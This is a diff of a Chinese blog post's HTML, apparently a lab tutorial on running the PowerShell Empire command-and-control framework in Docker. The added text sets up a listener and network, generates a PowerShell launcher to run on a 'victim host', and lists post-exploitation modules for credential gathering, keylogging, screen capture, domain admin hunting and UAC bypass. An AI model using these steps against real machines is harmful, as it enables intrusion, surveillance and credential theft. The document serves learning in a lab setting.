@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwxoyksf000jb04z4mlp3bfz" class="article article-type-post" itemscope
+    <article id="post-ckwz7cklx000gvc4z4epp0qof" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -210,12 +210,13 @@ sudo ./empire</code></pre>
 <span class="hljs-meta">#</span><span class="bash"> 打包镜像，不然下次运行还是缺少依赖包</span>
 docker commit 3aeed373c0fd empire2
 <span class="hljs-meta">#</span><span class="bash"> 之后便后生成镜像empire2，后续运行empire2就行</span>
-docker run -it 4</code></pre>
+docker run -it 434 /bin/bash</code></pre>
 
 <p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211207210530569.png" alt="image-20211207210530569"></p>
 <p>终于成功跑起来了，T.T</p>
 <p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/lx_clip1638806200654.png" alt="img"></p>
-<h1 id="3-基本功能概述"><a href="#3-基本功能概述" class="headerlink" title="3. 基本功能概述"></a>3. 基本功能概述</h1><h1 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4. 基本使用"></a>4. 基本使用</h1><h2 id="4-1-设置监听器"><a href="#4-1-设置监听器" class="headerlink" title="4.1 设置监听器"></a>4.1 设置监听器</h2><p>首先要进入监听器模块，之后选择监听器类型，设置URL，生成名称为test1的监听器，注意大小写敏感。</p>
+<h1 id="3-模块概述"><a href="#3-模块概述" class="headerlink" title="3. 模块概述"></a>3. 模块概述</h1><p>看了官网描述，大概模块分类如下：</p>
+<h1 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4. 基本使用"></a>4. 基本使用</h1><h2 id="4-1-设置监听器"><a href="#4-1-设置监听器" class="headerlink" title="4.1 设置监听器"></a>4.1 设置监听器</h2><p>首先要进入监听器模块，之后选择监听器类型，设置URL，生成名称为test1的监听器，注意大小写敏感。</p>
 <pre><code class="hljs shell">listeners
 uselistener http
 set Name test1
@@ -229,18 +230,71 @@ execute</code></pre>
 
 <p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211208215020219.png" alt="image-20211208215020219"></p>
 <p><font color="red"> <strong>注意：</strong> </font></p>
-<p>由于我是在docker中启动的empire，而docker环境在未进行配置的情况下不能被外部访问，只能通过-p指定端口，所以生成木马的时候上线主机应设置为宿主机的IP，之后得再改回来，比较麻烦。</p>
-<p>宿主机 IP：192.168.2.8</p>
-<p>docker IP：172.17.0.2</p>
-<p>先使用宿主机IP生成木马：</p>
+<p><del>由于我是在docker中启动的empire，而docker环境在未进行配置的情况下不能被外部访问，只能通过-p指定端口，所以生成木马的时候上线主机应设置为宿主机的IP，之后得再改回来，比较麻烦。</del></p>
+<p><del>宿主机 IP：192.168.2.8</del></p>
+<p><del>docker IP：172.17.0.2</del></p>
+<p><del>先使用宿主机IP生成木马：</del></p>
 <p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211208230234085.png" alt="image-20211208230234085"></p>
-<p>生成后更改IP为dockerIP，并重启监听器：</p>
+<p><del>生成后更改IP为dockerIP，并重启监听器：</del></p>
 <p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211208230343717.png" alt="image-20211208230343717"></p>
-<h3 id="4-2-上线操作"><a href="#4-2-上线操作" class="headerlink" title="4.2 上线操作"></a>4.2 上线操作</h3><p> 受害主机运行ps脚本，成功上线。首先重命名为win8，后续进入交互界面。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211208230529437.png" alt="image-20211208230529437"></p>
+<p>后续发现这样并不行，虽然能够上线，但是并不能执行命令，经测试，发现是docker网络环境导致。</p>
+<p>退出修改配置如下，使docker和宿主机在同一网段：</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 创建名称为<span class="hljs-built_in">test</span>的docker网络，ens33是宿主机的网卡名称</span>
+docker network create -d macvlan --subnet=192.168.2.100/24 --gateway=192.168.2.2 -o parent=ens33 test
+<span class="hljs-meta">#</span><span class="bash"> 查看创建的网络</span>
+docker network ls
+<span class="hljs-meta">#</span><span class="bash"> 运行empire，并指定网络和地址</span>
+docker run --net=test --ip=192.168.2.10 -itd empire2 /bin/bash
+<span class="hljs-meta">#</span><span class="bash"> 进入容器</span>
+docker exec -it 3f791 /bin/bash</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209220230689.png" alt="image-20211209220230689"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209220141601.png" alt="image-20211209220141601"></p>
+<h2 id="4-2-上线操作"><a href="#4-2-上线操作" class="headerlink" title="4.2 上线操作"></a>4.2 上线操作</h2><p> 生成ps脚本，受害主机运行ps脚本，成功上线。首先重命名为win8，后续进入交互界面。</p>
+<pre><code class="hljs shell">launcher powershell test</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209221118333.png" alt="image-20211209221118333"></p>
 <p>查看主机上线列表可以使用<code>agents</code>命令：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211208230914313.png" alt="image-20211208230914313"></p>
-<p>获取uid</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209221401264.png" alt="image-20211209221401264"></p>
+<p>进入<code>agent</code></p>
+<pre><code class="hljs shell">interact win8</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209221754119.png" alt="image-20211209221754119"></p>
+<p>一些基本的信息搜集：<code>systeminfo</code>，<code>getuid</code>，<code>creds</code></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211209222134918.png" alt="image-20211209222133970"></p>
+<p>使用模块搜集信息（存在中文乱码情况，暂未解决）：</p>
+<pre><code class="hljs plaintext">usemodule situational_awareness/host/computerdetails
+usemodule situational_awareness/host/winenum</code></pre>
+
+<p>其他模块：</p>
+<pre><code class="hljs shell">collection/screenshot
+collection/keylogger
+collection/clipboard_monitor
+<span class="hljs-meta">#</span><span class="bash">域内所有的共享</span>
+situational_awareness/network/powerview/share_finder
+<span class="hljs-meta">#</span><span class="bash">列举系统中所有有用的信息</span>
+situational_awareness/host/computerdetails
+<span class="hljs-meta">#</span><span class="bash">设置range扫描的网段</span>
+situational_awareness/network/arpscan 
+<span class="hljs-meta">#</span><span class="bash">DNS信息获取</span>
+situational_awareness/network/reverse_dns
+<span class="hljs-meta">#</span><span class="bash">查找域管登陆的机器</span>
+situational_awareness/network/powerview/user_hunter
+<span class="hljs-meta">#</span><span class="bash">本地管理组访问模块</span>
+situation_awareness/network/powerview/find_localadmin_access
+<span class="hljs-meta">#</span><span class="bash">绕过UAC实现管理员权限执行payload</span>
+privesc/bypassuac
+privesc/pypassuac_wscript</code></pre>
+
+<p><strong>参考链接：</strong></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HL561rl1hM13tVvNLmW_Kw">https://mp.weixin.qq.com/s/HL561rl1hM13tVvNLmW_Kw</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/13179730.html">https://www.cnblogs.com/vege/p/13179730.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32324332">https://zhuanlan.zhihu.com/p/32324332</a></p>
+</li>
+</ul>
 
         </div>
 
